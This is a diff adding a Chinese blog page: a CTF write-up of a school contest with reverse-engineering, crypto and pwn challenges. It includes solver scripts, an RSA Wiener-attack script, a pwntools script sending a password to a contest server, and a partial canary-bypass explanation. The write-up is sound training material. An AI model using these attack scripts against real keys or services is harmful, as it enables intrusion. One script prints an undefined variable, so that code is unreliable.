@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>校赛 WriteUp | Mr.Guo | 信息安全小白</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="RE">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="校赛 WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="校赛 WriteUp">
+<meta property="og:url" content="https://github.com/gha01un/gha01un.github.io/2020/09/25/%E6%A0%A1%E8%B5%9B/index.html">
+<meta property="og:site_name" content="Mr.Guo">
+<meta property="og:description" content="校赛 WP">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2020/09/25/kNc5QmoeHaS8fgC.png">
+<meta property="og:image" content="https://i.loli.net/2020/09/25/gp1ZCUMeOP7QIkL.png">
+<meta property="article:published_time" content="2020-09-25T11:54:42.867Z">
+<meta property="article:modified_time" content="2020-09-29T13:59:58.513Z">
+<meta property="article:author" content="Mr.Guo">
+<meta property="article:tag" content="RE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2020/09/25/kNc5QmoeHaS8fgC.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Mr.Guo" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="https://i.loli.net/2020/06/03/obm8dYauEDhsfFr.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Mr.Guo</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="/243839548@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/gha01un" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/5180160661/home?wvr=5" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Twitter" href="https://twitter.com/MrGuo243839548" target="_blank"title="Twitter" >
+                <i class="icon icon-lg icon-twitter twitter"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">校赛 WriteUp</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#校赛-WP"><span class="post-toc-number">1.</span> <span class="post-toc-text">校赛 WP</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#re1-签到"><span class="post-toc-number">2.</span> <span class="post-toc-text">re1  签到</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#re2-字节码"><span class="post-toc-number">3.</span> <span class="post-toc-text">re2  字节码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#re3-upx"><span class="post-toc-number">4.</span> <span class="post-toc-text">re3   upx</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#re4-easy-c"><span class="post-toc-number">5.</span> <span class="post-toc-text">re4   easy c++</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#cry1-幼儿园密码"><span class="post-toc-number">6.</span> <span class="post-toc-text">cry1   幼儿园密码</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#cry2-小学生"><span class="post-toc-number">7.</span> <span class="post-toc-text">cry2  小学生</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#cry3-初中生"><span class="post-toc-number">8.</span> <span class="post-toc-text">cry3   初中生</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#cry4-维也纳"><span class="post-toc-number">9.</span> <span class="post-toc-text">cry4  维也纳</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#misc-1-连签到都算不上"><span class="post-toc-number">10.</span> <span class="post-toc-text">misc 1  连签到都算不上</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#misc-2-真·签到题"><span class="post-toc-number">11.</span> <span class="post-toc-text">misc 2 真·签到题</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#misc-3-能看到我吗"><span class="post-toc-number">12.</span> <span class="post-toc-text">misc 3 能看到我吗</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#misc-4-别做题了听歌吧"><span class="post-toc-number">13.</span> <span class="post-toc-text">misc 4 别做题了听歌吧</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn1-test-nc"><span class="post-toc-number">14.</span> <span class="post-toc-text">pwn1  test_nc</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn2-babystack"><span class="post-toc-number">15.</span> <span class="post-toc-text">pwn2 babystack</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn3-canary"><span class="post-toc-number">16.</span> <span class="post-toc-text">pwn3 canary</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#pwn-4-fmstr"><span class="post-toc-number">17.</span> <span class="post-toc-text">pwn 4 fmstr</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-校赛"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">校赛 WriteUp</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2020-09-25 19:54:42" datetime="2020-09-25T11:54:42.867Z"  itemprop="datePublished">2020-09-25</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/CTF/">CTF</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">5</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h3 id="校赛-WP"><a href="#校赛-WP" class="headerlink" title="校赛 WP"></a>校赛 WP</h3><a id="more"></a>
+
+<h3 id="re1-签到"><a href="#re1-签到" class="headerlink" title="re1  签到"></a>re1  签到</h3><p>啊啊啊网站给关了，题目还找不到 </p>
+<p>这题应该是拖入ida，直接shift+f12就好了 懂得都懂</p>
+<h3 id="re2-字节码"><a href="#re2-字节码" class="headerlink" title="re2  字节码"></a>re2  字节码</h3><p>python字节码</p>
+<p>这打开网站看逻辑写py脚本  </p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">a=[<span class="number">80</span>,<span class="number">70</span>,<span class="number">94</span>,<span class="number">71</span>,<span class="number">85</span>,<span class="number">71</span>,<span class="number">85</span>,<span class="number">104</span> ,<span class="number">86</span> ,<span class="number">39</span> ,<span class="number">64</span> ,<span class="number">106</span> ,<span class="number">76</span>,<span class="number">67</span>,<span class="number">106</span>,<span class="number">71</span> ,<span class="number">123</span> ,<span class="number">92</span> ,<span class="number">125</span> ,<span class="number">76</span> ,<span class="number">37</span> ,<span class="number">106</span> ,<span class="number">103</span> ,<span class="number">118</span> ,<span class="number">80</span> ,<span class="number">35</span> ,<span class="number">119</span> ,<span class="number">32</span> ,<span class="number">110</span>]</span><br><span class="line">d=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    d+=chr(i ^ <span class="number">19</span>)  </span><br><span class="line">print(t)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="re3-upx"><a href="#re3-upx" class="headerlink" title="re3   upx"></a>re3   upx</h3><p>upx脱壳  放入kali  upx -d</p>
+<p>再拖入ida</p>
+<p>shift+f12  懂得都懂</p>
+<h3 id="re4-easy-c"><a href="#re4-easy-c" class="headerlink" title="re4   easy c++"></a>re4   easy c++</h3><p>拖入ida ，那个std::string::operation[]函数，一开始识别的参数个数是错误的，需要点进去，发现它需要3个参数<br>再返回，IDA会重新分析，然后大概逻辑就能看懂了，附上脚本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">r'eMl1_l1hT9_ldcoR3OC1CW0HhC_&#123;UF30Tp__l&#125;'</span></span><br><span class="line">sw = [<span class="number">0x15</span>,<span class="number">0x2</span>,<span class="number">0xA</span>,<span class="number">0x16</span>,<span class="number">0x13</span>,<span class="number">0xB</span>,<span class="number">0x11</span>,<span class="number">0x8</span>,<span class="number">0x3</span>,<span class="number">0x1B</span>,<span class="number">0x19</span>,<span class="number">0x21</span>,<span class="number">0x12</span>,<span class="number">0x1A</span>,<span class="number">0x18</span>,<span class="number">0x10</span>,<span class="number">0x9</span>,<span class="number">0x22</span>,<span class="number">0x24</span>,<span class="number">0x17</span>,<span class="number">0x4</span>,<span class="number">0xE</span>,<span class="number">0xC</span>,<span class="number">0x14</span>,<span class="number">0x1E</span>,<span class="number">0x0</span>,<span class="number">0x1D</span>,<span class="number">0x7</span>,<span class="number">0x1</span>,<span class="number">0x6</span>,<span class="number">0x1F</span>,<span class="number">0xF</span>,<span class="number">0x5</span>,<span class="number">0x1C</span>,<span class="number">0xD</span>,<span class="number">0x23</span>,<span class="number">0x20</span>,<span class="number">0x25</span>]</span><br><span class="line">s1a = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">38</span>)]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">38</span>):</span><br><span class="line">    s1a[sw[i]]=s1[i]</span><br><span class="line">print(s1a)</span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s1a:</span><br><span class="line">    flag+=i</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></div>
+
+<p>re实在太菜了，只做了四道题还是一堆签到题，low的不谈。</p>
+<h3 id="cry1-幼儿园密码"><a href="#cry1-幼儿园密码" class="headerlink" title="cry1   幼儿园密码"></a>cry1   幼儿园密码</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="number">324350545929838254331191385863847627003</span></span><br><span class="line">q=<span class="number">328413456989577256301798468872388310877</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">fai_n=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">print(fai_n)</span><br><span class="line">d=gmpy2.invert(e,fai_n)</span><br><span class="line">print(<span class="string">"d的十六进制值为："</span>)</span><br><span class="line">print(d)</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">n = <span class="number">0xeb80cc09ed9780fe25cadf7c168d2da3ea24e35237e92faf5ee0d7980c11302f</span></span><br><span class="line">c = <span class="number">0x596d5175112e346590aae5a3d633e71d2d12b28b60f08f8efa82fc092acc8c2d</span></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(hex(m))</span><br><span class="line">print(bytes.fromhex(hex(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="cry2-小学生"><a href="#cry2-小学生" class="headerlink" title="cry2  小学生"></a>cry2  小学生</h3><p>读python代码 理解其中意思即可</p>
+<p>设a=2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841</p>
+<p>根据代码</p>
+<p>dic = [chr(i) for i in range(ord(“A”), ord(“}”) + 1)]  懂得都懂了  照着原代码写就可以了</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line">a =<span class="string">"2108841084108840210884042088888882108881088888421088888841088842108888108888882088884108884210882088888108888421088888088888840888888841"</span></span><br><span class="line">dic = [chr(i) <span class="keyword">for</span> i <span class="keyword">in</span> range(ord(<span class="string">"A"</span>), ord(<span class="string">"&#125;"</span>) + <span class="number">1</span>)]</span><br><span class="line">flag = []</span><br><span class="line">s = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">    <span class="keyword">if</span>(a[i] != <span class="string">'0'</span>):</span><br><span class="line">        <span class="keyword">if</span>(a[i] == <span class="string">'8'</span>):</span><br><span class="line">            s = s + <span class="number">8</span></span><br><span class="line">        <span class="keyword">if</span>(a[i] == <span class="string">'4'</span>):</span><br><span class="line">            s = s + <span class="number">4</span></span><br><span class="line">        <span class="keyword">if</span>(a[i] == <span class="string">'2'</span>):</span><br><span class="line">            s = s + <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span>(a[i] == <span class="string">'1'</span>):</span><br><span class="line">            s = s + <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span>(a[i] == <span class="string">'0'</span>):</span><br><span class="line">        flag.append(s)</span><br><span class="line">        s = <span class="number">0</span></span><br><span class="line">x = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    x += dic[i<span class="number">-1</span>]</span><br><span class="line">print(x)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="cry3-初中生"><a href="#cry3-初中生" class="headerlink" title="cry3   初中生"></a>cry3   初中生</h3><p>根据题意 和下面已知的数可知，x=-3052……这个大数 我们求得p=-2764……..这个大数。phi=(p-1)*(q-1)=pq-(p+q)+1，构造p+q，<br>所以 (p+q)^2=(p-q)^2+4pq即可求得p+q。q=p+x,n=p×q  phi=(p+1)×(q+1)</p>
+<p>上脚本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">x=<span class="number">-3052070064538177039316204197190587772604720575847063904632214287646067455053231054471310322671549035272267675314294983896730810628462303176753740499536650509067032550999649642312183001467325569057721784454105443122299599368088210370664912463545058026638059476152117310712548608873763578306375998350729040793659145108802752313856984121444358377361896069243965149432626400631035486457915394853541729904150184876824863707417199152978276518660302136096681722191666079256269268999389217644896376343059852127338281844120448782198891495913902938174313438531667749920307775936355947018946620720978288405012504885451732231636</span></span><br><span class="line">p=<span class="number">-27645282466792257817358384518715154123933486746276391774444263805549184785758801611331727512618316117511830402291064671589992764575159205025150465127288678123273537254064555405597566045234264775696535233870342993688075308678745590840323230545378985874470970254306849398957159842378297616929194560560009113289974948388515331563429630185479068783351179683616591359572060950115733092007970489291940798526853201952607101543451447208843400052850424803320216100092186342006347459230274434357647688100553885838717057678699728084320705167709841528456836129264040561415840443911854851862230026044112813788167529469759180327221</span></span><br><span class="line">q=p+x</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p+<span class="number">1</span>)*(q+<span class="number">1</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">500276652165476232076654622771677157250768179732264713523579845370773246348163260024607736441521224561215622461281586014983237858652417057155657449969056265720660829190301384970568346350223955618393888481761163081860577739642188925549367659640679318096760942544021237730989148483458109811329253634447727676739448614959129278184402908867775906054394989855924225114919908155555192049492166217426223547541734881640953812554490770886539711015590595225643347250775256347202731382399075874986175633735843442294362952658782222039304359012268388983517266514673942584394340271959108268767970975584914229361774953712985148623666397952697929068249614923619593159697025023419729477175132378161714469266964087936259094268257305699373043845836862837431528242266637009047435391814783091218052253028403118436883809360635254672757916796698717205444912499939444332318464917599147934380674170566512663319563482316813585703326406255062594138402301545958040346473049702846530817878290456916073719516628914765617094899424596847550000272048391510943841604964078978359922836810502915050553112186304778654077116518976860791033948994210848441625200565771078991918078367509133628707097275095964646533882786598320142068378456597291213602688733329815247771873609</span></span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print(bytes.fromhex(hex(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="cry4-维也纳"><a href="#cry4-维也纳" class="headerlink" title="cry4  维也纳"></a>cry4  维也纳</h3><p>wienerAttack 之前做过类似的题，网上搜到攻击脚本</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform</span><span class="params">(x,y)</span>:</span></span><br><span class="line">   res=[]</span><br><span class="line">   <span class="keyword">while</span> y:</span><br><span class="line">       res.append(x//y)</span><br><span class="line">       x,y=y,x%y</span><br><span class="line">   <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">continued_fraction</span><span class="params">(sub_res)</span>:</span></span><br><span class="line">    numerator,denominator=<span class="number">1</span>,<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::<span class="number">-1</span>]:</span><br><span class="line">   	    denominator,numerator=numerator,i*numerator+denominator</span><br><span class="line">    <span class="keyword">return</span> denominator,numerator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_fraction</span><span class="params">(x,y)</span>:</span></span><br><span class="line">	res=transform(x,y)</span><br><span class="line">	res=list(map(continued_fraction,(res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(res)))))</span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pq</span><span class="params">(a,b,c)</span>:</span></span><br><span class="line">    par=gmpy2.isqrt(b*b<span class="number">-4</span>*a*c)</span><br><span class="line">    x1,x2=(-b+par)//(<span class="number">2</span>*a),(-b-par)//(<span class="number">2</span>*a)</span><br><span class="line">    <span class="keyword">return</span> x1,x2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wienerAttack</span><span class="params">(e,n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> (d,k) <span class="keyword">in</span> sub_fraction(e,n):</span><br><span class="line">         <span class="keyword">if</span> k==<span class="number">0</span>:</span><br><span class="line">         	<span class="keyword">continue</span></span><br><span class="line">         <span class="keyword">if</span> (e*d<span class="number">-1</span>)%k!=<span class="number">0</span>:</span><br><span class="line">         	<span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">         phi=(e*d<span class="number">-1</span>)//k</span><br><span class="line">         px,qy=get_pq(<span class="number">1</span>,n-phi+<span class="number">1</span>,n)</span><br><span class="line">         <span class="keyword">if</span> px*qy==n:</span><br><span class="line">            p,q=abs(int(px)),abs(int(qy))</span><br><span class="line">            d=gmpy2.invert(e,(p<span class="number">-1</span>)*(q<span class="number">-1</span>))</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    print(<span class="string">"Attack"</span>)</span><br><span class="line"></span><br><span class="line">e= <span class="number">25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193</span></span><br><span class="line">n= <span class="number">106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819</span></span><br><span class="line">d=wienerAttack(e,n)</span><br><span class="line">print(<span class="string">"d="</span>,d)</span><br></pre></td></tr></table></figure></div>
+
+<p>求出d=4001432317734070407477987975822419567810029780079645936018270575239527395536789310438299826077199193614373011908550209898633418531766102444584737312758497</p>
+<p>我们想要得到的是m  那么已知c，d，n，那m不就出来了吗</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">d=<span class="number">4001432317734070407477987975822419567810029780079645936018270575239527395536789310438299826077199193614373011908550209898633418531766102444584737312758497</span></span><br><span class="line">e= <span class="number">25917869905353789552020051839685545807585887908450046088427531244499827291976782167954270910349135145650576577205887579602980345558674985105395501978268901326322190984756245598741821138929832796245200282809945902092452927735584403680358445261613953914943536843526277769116394598364429894016586950531738412000187564890144398840990145571955885937892052001539698596307058524682284055181201743515900813100220071848907331770786412369754343096043812458135104781836976573362623373912743876433806153076511149098647316326372142332490513102220713378272264003312902390898505790604790827479508911958178382856897907933377199566193</span></span><br><span class="line">n= <span class="number">106602285831498822487486788497175055483413389274589435452182276717168915909703214196853831977107354376432175898907138060839801174230414399787961943308337842404599650916026415088762884858533403685998642441889119464243033004157478415547348866271362374758519029622126260984221580425672553497959526120398333794097492072777294689861833216730806226598330023420842069978222331772053519086812747673926909582663647038444661450353860411353335396908135442649692949063384865189330930012072526189754891675689042899811272336626668598113507084941522892240083044217780510968538395593221822537870102185136371596420208737931264071089819</span></span><br><span class="line">c=<span class="number">15398020641711885710559511139367125697390856767570980918702304069921551026824973830905965011884029877409200714436395451238518167931282498171004159255219750106440201159997510300464170737146936143635060376097700682667493454396974135053233282346399826911102207173673203896533100043044490481712129066709761310607999156923718443531985800620856745964481756350778958018672069263974407939095582178915567712702600480364745442553319386928686249421339611325002839784705114574454557275960371558688802008912473101758827685572398618014465630145531065781435184623872800843020069614302900368019005227544170327166191217204578975950160</span></span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"></span><br><span class="line">print(bytes.fromhex(hex(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="misc-1-连签到都算不上"><a href="#misc-1-连签到都算不上" class="headerlink" title="misc 1  连签到都算不上"></a>misc 1  连签到都算不上</h3><p>一串base64  提示是一张图片 在线转出二维码  扫一下发现是社会主义核心价值观编码 66666666</p>
+<h3 id="misc-2-真·签到题"><a href="#misc-2-真·签到题" class="headerlink" title="misc 2 真·签到题"></a>misc 2 真·签到题</h3><p>图片题，这不是我舍友头像嘛，真low，拖入winhex里，在最后面发现可疑的base64，在线转码发现是凯撒密码，ok</p>
+<h3 id="misc-3-能看到我吗"><a href="#misc-3-能看到我吗" class="headerlink" title="misc 3 能看到我吗"></a>misc 3 能看到我吗</h3><p>拖入winhex，是个zip，改后缀名，解压爆破，得到图片，foremost分离出来。。。</p>
+<h3 id="misc-4-别做题了听歌吧"><a href="#misc-4-别做题了听歌吧" class="headerlink" title="misc 4 别做题了听歌吧"></a>misc 4 别做题了听歌吧</h3><p>MP3Stego 用cmd打开 百度得到的一条指令 密码是cumt 得到一个aoheqiao.txt</p>
+<p>用010 editor打开，发现是摩斯密码，09，20表示.或- od oa表示回车和换行，在线莫斯密码转码得到flag</p>
+<h3 id="pwn1-test-nc"><a href="#pwn1-test-nc" class="headerlink" title="pwn1  test_nc"></a>pwn1  test_nc</h3><p>linux下nc！666666666666</p>
+<h3 id="pwn2-babystack"><a href="#pwn2-babystack" class="headerlink" title="pwn2 babystack"></a>pwn2 babystack</h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'202.119.201.197'</span>,<span class="number">10002</span>)</span><br><span class="line">payload=<span class="string">'1_love_y0u'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<p>low的不谈</p>
+<h3 id="pwn3-canary"><a href="#pwn3-canary" class="headerlink" title="pwn3 canary"></a>pwn3 canary</h3><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/09/25/kNc5QmoeHaS8fgC.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>来看看havefun函数</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://i.loli.net/2020/09/25/gp1ZCUMeOP7QIkL.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<p>read函数存在溢出，绕过canary。溢出点有puts输出  ，而buf内存是40h，那么偏移就是0x40-0x8=56.再读取8就可以得到canary。</p>
